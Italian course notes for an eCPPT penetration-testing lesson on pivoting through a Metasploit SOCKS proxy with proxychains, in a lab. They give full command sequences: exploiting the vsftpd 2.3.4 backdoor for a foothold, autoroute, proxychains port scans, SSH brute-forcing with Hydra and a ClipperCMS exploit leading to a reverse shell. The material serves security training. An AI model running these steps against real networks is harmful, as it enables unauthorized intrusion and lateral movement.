# 013 — Pivoting with SOCKS Proxy (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 13/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [013_Pivoting with SOCKS Proxy.txt](013_Pivoting with SOCKS Proxy.txt) · [013_Pivoting with SOCKS Proxy.srt](013_Pivoting with SOCKS Proxy.srt)

## Concetti chiave

- **SOCKS proxy** in Metasploit = espone un proxy SOCKS sul Kali OS che tunnella TUTTO il traffico attraverso la `route` MSF, senza limiti di porta singola.
- Combinato con **`proxychains`** → permette di usare qualsiasi tool (nmap, curl, Hydra, exploit Python…) verso la rete interna.
- Modulo MSF moderno: **`auxiliary/server/socks_proxy`** (versione legacy: `auxiliary/server/socks4a` o `socks5`).
- Porta default `proxychains`: **TCP 9050** (la stessa di Tor). Va allineata: `SRVPORT 9050` in MSF ↔ `socks4/socks5 127.0.0.1 9050` in `/etc/proxychains.conf`.
- Prerequisito: aver già fatto **`autoroute`** sulla subnet target.
- Differenza con `portfwd` (video 012): SOCKS = **system-wide proxy multi-porta**, `portfwd` = single port.

## Spiegazione approfondita

### Topologia con SOCKS proxy
```
                                            ╔═══════════════════════╗
                                            ║   RETE INTERNA        ║
[Kali] ──proxychains──> [MSF :9050]         ║                       ║
                              │             ║                       ║
                              │ route       ║   [VICTIM 2]          ║
                              v             ║   192.168.x.3         ║
                       [Meterpreter on      ║   web :80             ║
                        VICTIM 1 (pivot)]──>║   mysql :3306         ║
                                            ╚═══════════════════════╝

Tutto il traffico:
  Kali tool → proxychains → 127.0.0.1:9050 → MSF SOCKS module
            → route MSF → Meterpreter pivot → target interno
```

### Perché SOCKS è meglio di `portfwd`
- `portfwd` espone **una porta**. Per portscannare 1000 porte → 1000 forward.
- SOCKS proxy espone l'**intera rete** dietro al pivot, su tutte le porte, con qualsiasi protocollo TCP.
- Si abbina a **proxychains** che intercetta le syscall di rete e le redirige al SOCKS.

### Setup completo (riepilogo)

1. **Foothold + Meterpreter** sul pivot.
2. **`run autoroute -s <subnet>`** per registrare la route MSF.
3. **`background`** della sessione Meterpreter.
4. **`use auxiliary/server/socks_proxy`** (o `socks4a` in versioni vecchie).
5. **`set SRVPORT 9050`** (allineato a proxychains).
6. **`set VERSION 4a`** o `5` (compatibile con proxychains.conf).
7. **`run`** → MSF apre listener SOCKS su 127.0.0.1:9050.
8. **Da Kali OS**: `proxychains <comando>` → traffico tunnellato.

### `/etc/proxychains.conf`
Il file definisce a quale proxy mandare. Sezione finale tipica:
```
[ProxyList]
socks4  127.0.0.1 9050
# socks5 127.0.0.1 9050
```
Verifica con `cat /etc/proxychains.conf | tail`. Se il modulo MSF è `socks_proxy` con `VERSION 5`, scommenta la riga `socks5`.

### Versioni del modulo Metasploit
| Modulo | MSF versione | Note |
|---|---|---|
| `auxiliary/server/socks4a` | Vecchio (≤ 5.x) | Solo SOCKS4a |
| `auxiliary/server/socks5` | Vecchio | Solo SOCKS5 |
| **`auxiliary/server/socks_proxy`** | **Moderno (6.x)** | Unificato, `VERSION` selezionabile (4a/5) |

### Esempio end-to-end del lab
- Pivot: Linux con **vsftpd 2.3.4** (`exploit/unix/ftp/vsftpd_234_backdoor`) → command shell → `sessions -u 1` per upgrade a Meterpreter.
- Target interno: Linux con **ClipperCMS** vulnerabile → exploit ExploitDB 38730 (Python) → reverse shell.
- Tutto l'exploit Python gira `proxychains python ...` → arriva al target interno via il SOCKS proxy.

## Comandi & strumenti

```bash
# === In MSF, post-foothold ===
msf6 > sessions -u 1                  # upgrade shell → meterpreter
msf6 > sessions -i 2                  # entra in meterpreter session
meterpreter > ipconfig                # identifica subnet interna
meterpreter > background

# === Autoroute ===
msf6 > use post/multi/manage/autoroute
msf6 > set SUBNET 192.168.x.0
msf6 > set NETMASK 255.255.255.0
msf6 > set SESSION 2
msf6 > run

# === SOCKS proxy ===
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > set VERSION 4a               # o 5 (allinea con proxychains.conf)
msf6 > run -j                       # job in background

# Verifica listener:
$ netstat -antp | grep 9050         # ruby/MSF su 9050

# === /etc/proxychains.conf ===
$ cat /etc/proxychains.conf
# socks4  127.0.0.1 9050   ← deve corrispondere

# === Uso da Kali OS ===
proxychains nmap -sT -Pn -p 1-1000 <internal_ip>
proxychains curl http://<internal_ip>/
proxychains python exploit.py http://<internal_ip>/path admin password "id"
proxychains hydra -l root -P rockyou.txt ssh://<internal_ip>
proxychains ssh user@<internal_ip>
```

Tool/moduli citati:
- `exploit/unix/ftp/vsftpd_234_backdoor` (initial foothold)
- `post/multi/manage/autoroute`
- `auxiliary/server/socks_proxy`
- `proxychains` (CLI tool, Kali built-in)
- ExploitDB 38730 (Clipper CMS RCE)

## Esempi pratici

```
# === 1. Foothold via vsftpd 2.3.4 backdoor ===
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.0.0.3
msf6 > exploit
# [+] Command shell session 1 opened

# === 2. Upgrade a meterpreter ===
msf6 > sessions -u 1
# Meterpreter session 2 opened

# === 3. Enum + autoroute ===
msf6 > sessions -i 2
meterpreter > ifconfig
# eth1: 192.168.69.2/24  → subnet interna
meterpreter > background

msf6 > use post/multi/manage/autoroute
msf6 > set SUBNET 192.168.69.0
msf6 > set SESSION 2
msf6 > run
# [+] Route added

# === 4. SOCKS proxy ===
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > set VERSION 4a
msf6 > run -j

# === 5. Da Kali (altro terminale) ===
$ proxychains nmap -sT -Pn -p 80,443,3306,22 192.168.69.3
# 80/tcp open http
# 3306/tcp open mysql

$ proxychains curl http://192.168.69.3/
# → identifica Clipper CMS

# === 6. Exploit Clipper via proxychains ===
$ cp /usr/share/exploitdb/exploits/php/remote/38730.py .
$ proxychains python 38730.py http://192.168.69.3/clipper admin password "whoami"
# → reverse shell via SOCKS proxy
hostname
# victim2
```

## Punti d'attenzione per l'esame eCPPT

- **Modulo nome esatto**: `auxiliary/server/socks_proxy` (moderno). Versione legacy: `socks4a` / `socks5`.
- **Porta 9050** = default proxychains. Allinea sempre `SRVPORT` MSF ↔ riga `proxychains.conf`.
- **Versione SOCKS** (4a vs 5) deve combaciare in entrambi i file/modulo.
- **`proxychains <cmd>`**: prefisso obbligatorio per ogni tool esterno che deve passare nella rete pivotata.
- **`proxychains` supporta solo TCP** (no ICMP) → `nmap -sn` ping sweep NON funziona attraverso il proxy. Usa `nmap -sT -Pn`.
- **`-sT` (TCP connect)** obbligatorio via proxychains — SYN scan raw non passa.
- **Prerequisito**: `autoroute` deve essere attivo. Senza route MSF non sa come instradare.
- **`run -j`** = lancia il modulo in background come job → puoi continuare a usare MSF.
- **Vantaggio vs `portfwd`**: tutta la subnet, tutte le porte, qualsiasi tool.
- **Svantaggio**: latenza maggiore, no UDP, qualche exploit complesso può non funzionare.
- **Combinabile con altri tool**: Hydra, sqlmap, ssh, curl, nikto, gobuster… tutti supportati via `proxychains`.

## Collegamenti con altri video

- Precedente: [[012_Pivoting & Port Forwarding with Metasploit]] — port forwarding singolo.
- Prossimo: [[014_Pivoting via SSH Tunneling]] — alternativa nativa OS senza MSF.
- Pivoting senza root: [[015_Pivoting with reGeorg]] — quando hai solo una web shell.
- Foothold da PtH: [[09_Pass-the-Hash with Metasploit]]
